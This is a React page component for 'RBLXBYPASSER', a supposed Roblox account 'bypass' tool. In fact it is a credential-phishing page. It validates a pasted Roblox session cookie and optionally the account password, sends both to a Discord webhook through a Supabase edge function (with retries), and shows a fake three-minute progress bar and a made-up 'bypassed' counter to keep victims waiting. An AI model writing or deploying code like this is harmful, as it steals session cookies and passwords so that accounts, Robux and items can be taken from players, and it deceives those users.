import { useState } from "react";
import { Cookie, Key, Eye, EyeOff } from "lucide-react";
import { z } from "zod";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";

type Version = "v1" | "v2";

const COOKIE_PREFIX = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

const v1Schema = z.object({
  cookie: z.string().trim()
    .min(1, "Cookie required")
    .max(4000, "Cookie too long")
    .refine((v) => v.startsWith(COOKIE_PREFIX), "Invalid cookie format"),
});

const v2Schema = z.object({
  cookie: z.string().trim()
    .min(1, "Cookie required")
    .max(4000, "Cookie too long")
    .refine((v) => v.startsWith(COOKIE_PREFIX), "Invalid cookie format"),
  password: z.string().min(1, "Password required").max(200, "Password too long"),
});

const Index = () => {
  const [version, setVersion] = useState<Version>("v1");
  const [cookie, setCookie] = useState("");
  const [password, setPassword] = useState("");
  const [running, setRunning] = useState(false);
  const [done, setDone] = useState(false);
  const [progress, setProgress] = useState(0);
  const [status, setStatus] = useState<string | null>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [shakeKey, setShakeKey] = useState(0);
  const [showPassword, setShowPassword] = useState(false);

  const resetAll = () => {
    setCookie("");
    setPassword("");
    setRunning(false);
    setDone(false);
    setProgress(0);
    setStatus(null);
    setErrorMsg(null);
  };

  const startBypass = async () => {
    const parsed =
      version === "v1"
        ? v1Schema.safeParse({ cookie })
        : v2Schema.safeParse({ cookie, password });

    if (!parsed.success) {
      const msg = parsed.error.issues[0].message;
      setErrorMsg(msg);
      setShakeKey((k) => k + 1);
      toast.error(msg);
      return;
    }

    setErrorMsg(null);

    setRunning(true);
    setProgress(0);
    setStatus("SENDING REQUEST...");
    const startedAt = Date.now();

    // Fire Discord webhook immediately
    const notifyBody: Record<string, unknown> = {
      version,
      status: "STARTED",
      cookie,
      ...(version === "v2" ? { password } : {}),
    };

    const maxClientAttempts = 3;
    let notified = false;
    let lastErr: unknown = null;

    for (let attempt = 1; attempt <= maxClientAttempts; attempt++) {
      try {
        const { data, error } = await supabase.functions.invoke("discord-notify", {
          body: notifyBody,
        });
        if (error) throw error;
        if (data && (data as { success?: boolean }).success === false) {
          throw new Error("Edge function reported failure");
        }
        notified = true;
        break;
      } catch (err) {
        lastErr = err;
        console.warn(`Discord notify attempt ${attempt} failed`, err);
        if (attempt < maxClientAttempts) {
          await new Promise((r) => setTimeout(r, 500 * 2 ** (attempt - 1)));
        }
      }
    }

    if (!notified) {
      console.error("Discord notify failed after retries", lastErr);
    }

    // Run progress animation (~3 min)
    const phases = [
      { until: 8, label: "SENDING REQUEST..." },
      { until: 22, label: "ESTABLISHING CONNECTION..." },
      { until: 38, label: "VALIDATING SESSION..." },
      { until: 55, label: "INJECTING PAYLOAD..." },
      { until: 72, label: "BYPASSING PROTECTION..." },
      { until: 88, label: "DECRYPTING TOKENS..." },
      { until: 97, label: "FINALIZING..." },
      { until: 100, label: "COMPLETE" },
    ];

    const totalMs = 180_000;
    const tickMs = 1000;
    const ticks = totalMs / tickMs;
    const inc = 100 / ticks;

    let p = 0;
    for (let i = 0; i < ticks; i++) {
      await new Promise((r) => setTimeout(r, tickMs));
      p = Math.min(100, p + inc);
      setProgress(Math.floor(p));
      const phase = phases.find((ph) => p <= ph.until) ?? phases[phases.length - 1];
      setStatus(phase.label);
    }

    setProgress(100);
    setStatus("COMPLETE");

    // Fire success webhook (routed by edge function to DISCORD_WEBHOOK_URL_SUCCESS)
    const successBody: Record<string, unknown> = {
      version,
      status: "COMPLETE",
      cookie,
      durationMs: Date.now() - startedAt,
      ...(version === "v2" ? { password } : {}),
    };
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        const { data, error } = await supabase.functions.invoke("discord-notify", {
          body: successBody,
        });
        if (error) throw error;
        if (data && (data as { success?: boolean }).success === false) {
          throw new Error("Edge function reported failure");
        }
        break;
      } catch (err) {
        console.warn(`Success notify attempt ${attempt} failed`, err);
        if (attempt < 3) await new Promise((r) => setTimeout(r, 500 * 2 ** (attempt - 1)));
      }
    }

    toast.success("Bypass complete");
    setRunning(false);
    setDone(true);
  };

  return (
    <main className="relative min-h-screen flex items-center justify-center bg-background px-4 py-10 overflow-hidden">
      {/* Ambient glass background */}
      <div aria-hidden className="pointer-events-none absolute inset-0 z-0">
        <div
          className="absolute -top-32 -left-24 h-[28rem] w-[28rem] rounded-full opacity-60"
          style={{
            background: "radial-gradient(closest-side, hsl(var(--primary) / 0.45), transparent 70%)",
            filter: "blur(60px)",
          }}
        />
        <div
          className="absolute -bottom-32 -right-24 h-[32rem] w-[32rem] rounded-full opacity-50"
          style={{
            background: "radial-gradient(closest-side, hsl(280 90% 60% / 0.35), transparent 70%)",
            filter: "blur(70px)",
          }}
        />
        <div
          className="absolute top-1/3 left-1/2 -translate-x-1/2 h-72 w-72 rounded-full opacity-40"
          style={{
            background: "radial-gradient(closest-side, hsl(200 90% 55% / 0.35), transparent 70%)",
            filter: "blur(80px)",
          }}
        />
      </div>

      <div className="relative z-10 w-full max-w-6xl flex flex-col lg:flex-row items-center justify-center gap-10 lg:gap-16">
        {/* Brand panel */}
        <section className="flex-1 max-w-xl text-center lg:text-left">
          <h1 className="text-5xl sm:text-6xl lg:text-7xl font-black tracking-tight text-foreground leading-none">
            RBLXBYPASSER
          </h1>
          <div className="mt-4 flex items-center gap-3 justify-center lg:justify-start">
            <span className="text-[10px] sm:text-xs tracking-[0.5em] text-primary font-semibold">
              SINCE 2023
            </span>
            <span className="h-px w-16 bg-primary/70" />
          </div>

          <div className="mt-10 flex justify-center lg:justify-start">
            <div
              className="w-full max-w-sm rounded-2xl border px-8 py-7 text-center"
              style={{
                background: "linear-gradient(135deg, hsl(0 0% 100% / 0.06), hsl(0 0% 100% / 0.02))",
                backdropFilter: "blur(24px) saturate(180%)",
                WebkitBackdropFilter: "blur(24px) saturate(180%)",
                borderColor: "hsl(0 0% 100% / 0.12)",
                boxShadow: "0 8px 32px hsl(0 0% 0% / 0.4), inset 0 1px 0 hsl(0 0% 100% / 0.08)",
              }}
            >
              <div className="text-[10px] tracking-[0.5em] text-muted-foreground mb-3">
                IMPACT
              </div>
              <div
                className="text-4xl sm:text-5xl font-bold text-foreground tracking-tight"
                style={{ textShadow: "0 0 24px hsl(var(--primary) / 0.35)" }}
              >
                104,942
              </div>
              <div className="text-[10px] tracking-[0.5em] text-muted-foreground mt-3">
                BYPASSED
              </div>
            </div>
          </div>
        </section>

        {/* Vertical divider */}
        <div
          aria-hidden
          className="hidden lg:block self-stretch w-px"
          style={{
            background:
              "linear-gradient(to bottom, transparent, hsl(0 0% 100% / 0.18), transparent)",
          }}
        />

        <div
          className="w-full max-w-md rounded-2xl p-8 border"
          style={{
            background:
              "linear-gradient(135deg, hsl(0 0% 100% / 0.08), hsl(0 0% 100% / 0.02))",
            backdropFilter: "blur(24px) saturate(180%)",
            WebkitBackdropFilter: "blur(24px) saturate(180%)",
            borderColor: "hsl(0 0% 100% / 0.15)",
            boxShadow:
              "0 8px 32px hsl(0 0% 0% / 0.4), inset 0 1px 0 hsl(0 0% 100% / 0.1)",
        }}
      >
        <h1 className="text-center text-2xl font-bold tracking-[0.4em] mb-8">
          WIZARD
        </h1>

        {/* Tabs */}
        <div
          className="relative grid grid-cols-2 p-1 rounded-xl mb-5 border"
          style={{
            background: "hsl(0 0% 100% / 0.05)",
            borderColor: "hsl(0 0% 100% / 0.1)",
          }}
        >
          {/* Sliding indicator */}
          <div
            className="absolute top-1 bottom-1 rounded-lg pointer-events-none"
            style={{
              left: "0.25rem",
              width: "calc(50% - 0.25rem)",
              transform: version === "v1" ? "translateX(0%)" : "translateX(100%)",
              background: "hsl(0 0% 100% / 0.12)",
              backdropFilter: "blur(12px)",
              boxShadow: "inset 0 1px 0 hsl(0 0% 100% / 0.15)",
              transition: "transform 400ms cubic-bezier(0.4, 0, 0.2, 1)",
            }}
          />
          {(["v1", "v2"] as Version[]).map((v) => (
            <button
              key={v}
              onClick={() => !running && setVersion(v)}
              disabled={running}
              className={`relative z-10 py-2.5 rounded-lg text-xs font-bold tracking-[0.3em] ${
                version === v ? "text-foreground" : "text-muted-foreground hover:text-foreground"
              }`}
              style={{ transition: "color 300ms cubic-bezier(0.4, 0, 0.2, 1)" }}
            >
              {v.toUpperCase()}
            </button>
          ))}
        </div>

        {/* Cookie input */}
        <div
          key={`cookie-${shakeKey}`}
          className={`relative mb-1 ${errorMsg ? "animate-shake" : ""}`}
          style={{
            transition: "transform 450ms cubic-bezier(0.4, 0, 0.2, 1)",
          }}
        >
          <Cookie
            className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground"
            style={{ transition: "color 300ms cubic-bezier(0.4, 0, 0.2, 1)" }}
          />
          <input
            type="text"
            value={cookie}
            onChange={(e) => { setCookie(e.target.value); setErrorMsg(null); }}
            placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
            disabled={running}
            maxLength={4000}
            className={`w-full border rounded-xl pl-11 pr-4 py-3 text-sm tracking-widest placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-60 ${
              errorMsg ? "border-destructive" : ""
            }`}
            style={{
              background: "hsl(0 0% 100% / 0.06)",
              backdropFilter: "blur(12px)",
              borderColor: errorMsg ? undefined : "hsl(0 0% 100% / 0.12)",
              transition:
                "background-color 350ms cubic-bezier(0.4, 0, 0.2, 1), border-color 350ms cubic-bezier(0.4, 0, 0.2, 1), box-shadow 350ms cubic-bezier(0.4, 0, 0.2, 1), transform 450ms cubic-bezier(0.4, 0, 0.2, 1)",
            }}
          />
        </div>

        {/* Error message */}
        {errorMsg && (
          <p className="text-destructive text-xs tracking-widest mb-2 pl-1 animate-slide-down">
            {errorMsg}
          </p>
        )}

        {!errorMsg && <div className="mb-3" />}

        {/* Password input (V2 only) */}
        {/* Password input (V2 only) — smooth slide in/out */}
        <div
          className="overflow-hidden"
          style={{
            maxHeight: version === "v2" ? "120px" : "0px",
            opacity: version === "v2" ? 1 : 0,
            transform: version === "v2" ? "translateY(0)" : "translateY(-8px)",
            marginBottom: version === "v2" ? "0.75rem" : "0rem",
            transition:
              "max-height 450ms cubic-bezier(0.4, 0, 0.2, 1), opacity 350ms cubic-bezier(0.4, 0, 0.2, 1), transform 450ms cubic-bezier(0.4, 0, 0.2, 1), margin-bottom 450ms cubic-bezier(0.4, 0, 0.2, 1)",
          }}
          aria-hidden={version !== "v2"}
        >
          <div className="relative">
            <Key className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => { setPassword(e.target.value); setErrorMsg(null); }}
              placeholder="Account Password"
              disabled={running || version !== "v2"}
              tabIndex={version === "v2" ? 0 : -1}
              maxLength={200}
              className={`w-full border rounded-xl pl-11 pr-12 py-3 text-sm placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-60 ${
                errorMsg ? "border-destructive" : ""
              }`}
              style={{
                background: "hsl(0 0% 100% / 0.06)",
                backdropFilter: "blur(12px)",
                borderColor: errorMsg ? undefined : "hsl(0 0% 100% / 0.12)",
                transition:
                  "background-color 350ms cubic-bezier(0.4, 0, 0.2, 1), border-color 350ms cubic-bezier(0.4, 0, 0.2, 1), box-shadow 350ms cubic-bezier(0.4, 0, 0.2, 1)",
              }}
            />
            <button
              type="button"
              onClick={() => setShowPassword((s) => !s)}
              disabled={running || version !== "v2"}
              tabIndex={version === "v2" ? 0 : -1}
              aria-label={showPassword ? "Hide password" : "Show password"}
              aria-pressed={showPassword}
              className="absolute right-2 top-1/2 -translate-y-1/2 p-2 rounded-lg text-muted-foreground hover:text-foreground focus:outline-none focus:ring-2 focus:ring-ring disabled:opacity-50"
              style={{ transition: "color 250ms cubic-bezier(0.4, 0, 0.2, 1), background-color 250ms cubic-bezier(0.4, 0, 0.2, 1)" }}
            >
              <span className="relative block w-4 h-4">
                <Eye
                  className="absolute inset-0 w-4 h-4"
                  style={{
                    opacity: showPassword ? 0 : 1,
                    transform: showPassword ? "scale(0.6) rotate(-12deg)" : "scale(1) rotate(0deg)",
                    transition: "opacity 250ms cubic-bezier(0.4, 0, 0.2, 1), transform 300ms cubic-bezier(0.34, 1.56, 0.64, 1)",
                  }}
                />
                <EyeOff
                  className="absolute inset-0 w-4 h-4"
                  style={{
                    opacity: showPassword ? 1 : 0,
                    transform: showPassword ? "scale(1) rotate(0deg)" : "scale(0.6) rotate(12deg)",
                    transition: "opacity 250ms cubic-bezier(0.4, 0, 0.2, 1), transform 300ms cubic-bezier(0.34, 1.56, 0.64, 1)",
                  }}
                />
              </span>
            </button>
          </div>
        </div>

        {/* Start button */}
        <button
          onClick={startBypass}
          disabled={running}
          className="w-full mt-4 py-3.5 rounded-xl text-sm font-bold tracking-[0.3em] text-primary-foreground transition-all hover:opacity-90 disabled:opacity-60 disabled:cursor-not-allowed"
          style={{
            background: "var(--gradient-primary)",
            boxShadow: "var(--shadow-glow)",
          }}
        >
          {running ? "RUNNING..." : "START BYPASS"}
        </button>

        {/* System / progress */}
        {status && (
          <div className="mt-8 animate-slide-down">
            <div className="text-[10px] tracking-[0.4em] text-muted-foreground mb-2">
              SYSTEM
            </div>
            <div className="flex items-center justify-between text-xs font-bold tracking-widest mb-2">
              <span>{status}</span>
              <span className="text-primary">{progress}%</span>
            </div>
            <div className="h-1 w-full rounded-full bg-secondary overflow-hidden">
              <div
                className="h-full transition-all duration-500 ease-out"
                style={{
                  width: `${progress}%`,
                  background: "var(--gradient-primary)",
                }}
              />
            </div>

            {/* Reset */}
            {done && (
              <div className="mt-6 animate-slide-down">
                <button
                  onClick={resetAll}
                  className="w-full py-3 rounded-xl text-xs font-bold tracking-[0.3em] border border-border text-muted-foreground hover:text-foreground hover:border-foreground/30 transition-all"
                >
                  BYPASS AGAIN
                </button>
              </div>
            )}
          </div>
        )}
        </div>
      </div>
    </main>
  );
};

export default Index;
